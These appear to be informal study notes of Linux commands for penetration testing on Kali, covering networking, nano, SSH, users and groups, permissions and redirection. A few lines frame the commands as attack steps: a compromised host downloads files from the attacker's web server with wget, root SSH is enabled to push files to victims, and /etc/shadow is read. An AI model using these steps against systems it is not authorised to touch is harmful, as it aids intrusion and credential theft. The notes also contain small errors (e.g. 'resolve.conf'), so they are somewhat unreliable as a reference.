ifconfig        //to get ipaddress 
nslookup google.com//any website will work        //will give dns server ip
cat /etc/resolve.conf       //gives dns server ip
ip route        //to get gateway
traceroute google.com//any website          //to get gateway and trace the path of the packet

netstat -antp               //to see what service are running on that server and which host are using that services on that server
-a : all
-n : show numerical address
-t : tcp
-p : show the name of the program

------------------NANO--------------------------------
nano Clone of pico (for older version)
nano newFile.txt    //creates file or open if already exists
ctrl + G : help
ctrl + X : save and exit
ctrl + W : to search for words in nano interface (alt + W to go to next word)
ctrl + K : cut text
ctrl + U : paste cutted text

-------------- Service conf --------------------------
turning on webserver on kali machine
service apache2 start

//webfile are located at
/var/www/html/
//in this file we can put files which can be downloaded on other systems

example (Compromissed host ubuntu)
ubuntu@debian:~# wget http://IPofkali_thatIsMyMachine/FileNameWhichIsToBEDownloaded

-------------- Configuration file -------------------
service ssh start           //to start service in the machine in which we want ssh shell
//for example we will start that service in our kali mahine from above command
//here we want be able to log as root so we have modify our ssh config
nano /etc/ssh/sshd_config

remove # this from PermitRootLogin Prohibit-password to PermitRootLogin yes
and save the file

//now if we do 
ssh localhost 
//and enter root password we will have root ssh shell
---------------------ssh server as kali --------------------------
cd /etc/ssh     //directory of ssh keys in kali machine
//this has to be done once when we freshly install our kali machine
mkdir default-keys
mv ssh_host_* default-keys/
//Now generating new keys
dpkg-reconfigure openssh-server
//we will do the above process in which we permit rootlogin form conf file
//in this way we allow other machine to log in our system as root and can download file from our system

//If windows machine and we want to download file from remote server we can use WinSCP
enter Credentials and get GUI Interface of the machine and dowload files

//This is to just give shell
//If Linux machine
ssh IP_file_provider_machine
//this will by default as root user in file_Provider_machine
//but if we want specific user to log
ssh username@IP_file_provider_machine

we can use scp to copy file to compromised machine from form our kali machine just google the syntax

---------------- Managing user and groups ----------------------
whoami      //display your username
w           //show who logged on and what they're doing
cat /etc/passwd     //see a list of users
cat /etc/shadow     //see encrypted passwords

id      //display group of your username
groups username //gives groupname of the user
cat /etc/groups //lists of all group in machine

adduser mit     //create a new user mit with home dir
useradd mit     //create a new user mit without home dir
userdel mit     //delete user mit
deluser --remove-home mit   //Delte user mit and remove home dir

addgroup IIT        //create a new group IIT
usermod -g IIT MIT  //changing MIT group to IIT group
delgroup MIT        //Delete group MIT

-----------Maintaining permission of users------------------------
syntax -
chmod ugoa +-= rwx filename
+ add permission
- remove permission
= only permission

example
chmod u+x somefile (somefile executable for owner)
chmod a+rw somefile (somefile readable and writeable by everyone)


sudo -l (list programs you can run as root)
config sudo
/etc/sudoers/
# User privilege specification
root ALL=(ALL:ALL) ALL
user1 ALL=(ALL:ALL) ALL     //user1 is user on os
user2 ALL=(ALL:ALL) ALL     //user2 is user on os

----------------------Redirecting------------------------------
> //directs command output to file. Create file automatically and overwrites file if it exists.
>> //Appends command output to file
<  //Directs content of file to command

wc -l file.txt      //(word count)counts number of lines in file

| cut -d " " -f 2   //this command will cut output from spaces 1st space to 2nd space
| sort -u           //this command will sort and remove duplicate data when piped

------------------------------------------------------------------